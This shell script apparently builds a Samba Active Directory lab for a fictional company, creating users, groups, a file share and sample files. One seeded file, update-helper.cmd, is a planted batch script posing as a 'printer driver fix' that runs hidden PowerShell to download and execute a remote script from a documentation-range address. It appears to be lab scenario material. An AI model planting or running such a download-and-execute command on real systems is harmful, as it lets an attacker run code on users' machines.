# Provisions the ridgeline.local domain, its users and groups, and the Labs file share (runs once,
# at build time). The share's ACLs are set when the container starts: dc/acls.sh.
set -eu
umask 022
DOM=DC=ridgeline,DC=local
BASE=OU=Ridgeline,$DOM
# Lab-only password, documented in the README.
PASS='Lab-AD-2026!'

rm -f /etc/samba/smb.conf
# Containers can't write security.* extended attributes, so file ACLs go to a tdb file (xattr_tdb).
samba-tool domain provision --realm=RIDGELINE.LOCAL --domain=RIDGELINE --server-role=dc \
  --dns-backend=SAMBA_INTERNAL --host-name=dc01 --host-ip=10.203.16.10 --adminpass="$PASS" \
  --use-rfc2307 --function-level=2016 \
  --option="ad dc functional level = 2016" \
  --option="vfs objects = dfs_samba4 acl_xattr xattr_tdb" \
  --option="xattr_tdb:file=/var/lib/samba/xattr.tdb" \
  --option="dns forwarder = 127.0.0.11" >/dev/null

# The file share. Only the stored NT ACL decides access (like NTFS), not the Unix mode bits.
mkdir -p /srv/labs
cat >> /etc/samba/smb.conf <<'CONF'

[Labs]
	path = /srv/labs
	read only = no
	acl_xattr:ignore system acls = yes
CONF

samba-tool ou add "$BASE" --description="Ridgeline Outfitters" >/dev/null
for ou in HR IT Finance Sales Warehouse; do samba-tool ou add "OU=$ou,$BASE" >/dev/null; done

user() { # sam given surname ou title
  samba-tool user add "$1" "$PASS" --given-name="$2" --surname="$3" --userou="OU=$4,OU=Ridgeline" \
    --job-title="$5" --department="$4" >/dev/null
}
user ptorres Paula Torres HR "HR Manager"
user nokeke Nia Okeke HR "HR Generalist"
user jalvarez Jorge Alvarez IT "IT Manager"
user sbrennan Shawn Brennan IT "Systems Administrator"
user mreyes Maya Reyes Finance "Accounts Payable Lead"
user rkowalski Rita Kowalski Sales "Sales Manager"
user kfischer Karl Fischer Warehouse "Forklift Operator"

grp() { samba-tool group add "$1" --groupou="OU=$2,OU=Ridgeline" >/dev/null; samba-tool group addmembers "$1" "$3" >/dev/null; }
grp HR-Staff HR ptorres,nokeke
grp IT-Staff IT jalvarez,sbrennan
grp Finance-Staff Finance mreyes
grp Sales-Staff Sales rkowalski
grp Warehouse-Staff Warehouse kfischer
# All-Staff holds the department groups, not people: membership is nested.
samba-tool group add All-Staff --groupou=OU=Ridgeline >/dev/null
samba-tool group addmembers All-Staff HR-Staff,IT-Staff,Finance-Staff,Sales-Staff,Warehouse-Staff >/dev/null

mkdir -p /srv/labs/HR-Files /srv/labs/Public /srv/labs/IT-Tools
printf 'employee,salary\nP. Torres,84000\nN. Okeke,61000\n' > /srv/labs/HR-Files/payroll-2026.csv
printf 'Ridgeline Outfitters staff handbook, revision 7.\n' > /srv/labs/Public/handbook.txt
printf '@echo off\r\nnet use H: \\\\rdg-fs01\\home\\%%USERNAME%%\r\n' > /srv/labs/IT-Tools/map-drives.cmd
# Planted through the writable IT-Tools folder (the address is a documentation range).
printf '@echo off\r\nrem printer driver fix\r\npowershell -nop -w hidden -c "iwr http://203.0.113.50/u.ps1 | iex"\r\n' > /srv/labs/IT-Tools/update-helper.cmd

# Kerberos straight to the local KDC (Docker's DNS doesn't know the domain's SRV records).
cat > /etc/krb5.conf <<'KRB'
[libdefaults]
	default_realm = RIDGELINE.LOCAL
	dns_lookup_realm = false
	dns_lookup_kdc = false
[realms]
	RIDGELINE.LOCAL = {
		kdc = 127.0.0.1
	}
[domain_realm]
	.ridgeline.local = RIDGELINE.LOCAL
	dc01 = RIDGELINE.LOCAL
KRB
